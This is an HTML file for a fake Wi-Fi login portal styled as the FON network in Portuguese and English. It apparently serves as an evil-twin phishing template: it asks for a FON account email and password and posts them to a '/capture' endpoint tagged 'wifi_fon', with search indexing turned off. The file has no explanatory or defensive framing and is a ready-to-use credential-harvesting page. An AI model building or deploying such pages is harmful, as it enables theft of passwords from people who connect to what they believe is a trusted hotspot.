<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>Wi-Fi FON - Portal de Acesso</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { font-size: 16px; }
body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #E63329; color: #222; padding: 16px; }
.card { background: #FFFFFF; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.2); }
.logo { text-align: center; margin-bottom: 24px; }
.logo .wifi { font-size: 14px; font-weight: 700; color: #888; letter-spacing: 2px; text-transform: uppercase; display: block; margin-bottom: 4px; }
.logo .fon { font-size: 48px; font-weight: 900; color: #E63329; line-height: 1; }
.subtitle { text-align: center; color: #555; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
.form-group { margin-bottom: 16px; }
label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #222; }
input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #DDD; border-radius: 8px; font-size: 15px; background: #FAFAFA; color: #222; outline: none; transition: border-color 0.2s; }
input:focus { border-color: #E63329; }
button[type="submit"] { width: 100%; padding: 14px; background: #E63329; color: #FFFFFF; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; }
button:hover { opacity: 0.92; }
.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #999; }
input[type="hidden"] { display: none; }
@media (max-width: 480px) { .card { padding: 24px 18px; } .logo .fon { font-size: 38px; } }
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <span class="wifi">Wi-Fi</span>
    <span class="fon">FON</span>
  </div>
  <p class="subtitle">Acesse a rede global FON. Faca login com sua conta para se conectar.</p>
  <form action="/capture" method="POST" autocomplete="off">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="portal_id" value="wifi_fon">
    <div class="form-group">
      <label for="email">E-mail da conta FON</label>
      <input type="email" name="email" id="email" placeholder="seu@email.com" required autocomplete="off">
    </div>
    <div class="form-group">
      <label for="password">Senha</label>
      <input type="password" name="password" id="password" placeholder="Sua senha" required minlength="6" maxlength="128" autocomplete="new-password">
    </div>
    <button type="submit">Conectar ao FON</button>
  </form>
  <p class="footer">FON - A maior rede Wi-Fi do mundo</p>
</div>
<script>
(function(){
  var lang = navigator.language || 'pt-BR';
  if (lang.startsWith('en')) {
    document.querySelector('.subtitle').textContent = 'Access the global FON network. Log in with your account to connect.';
    document.querySelector('button[type=submit]').textContent = 'Connect to FON';
    document.querySelector('label[for=email]').textContent = 'FON account email';
    document.querySelector('label[for=password]').textContent = 'Password';
    document.querySelector('.footer').textContent = 'FON - The world\'s largest Wi-Fi network';
  }
})();
</script>
</body>
</html>
